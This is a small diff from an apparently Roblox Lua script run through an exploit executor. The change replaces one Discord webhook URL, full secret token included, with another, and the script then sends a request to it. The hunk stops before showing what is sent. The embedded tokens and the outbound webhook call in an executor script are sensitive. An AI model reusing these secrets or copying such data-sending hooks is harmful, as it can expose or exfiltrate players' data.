@@ -56,7 +56,7 @@ end
 
 local Toggle = true
 local HttpService = game:GetService("HttpService")
-local Webhook_URL = "https://discord.com/api/webhooks/1088952876262502430/W9a6Z2FMbqFRPF4woXe8mxcseTnp9RxqVRKsL3ZfNJUO_FKPd3BOzMK6ZzODTw1wudLj"
+local Webhook_URL = "https://discord.com/api/webhooks/1089234416011845632/Hom_xMh9lY_U8Ld0QF3CeC4UikPaQ5ZGxO5Ya6Cb2cd02x-DU-MN1ahHQr-py1EZWvWr"
 
 local response = syn.request({
     Url = Webhook_URL,
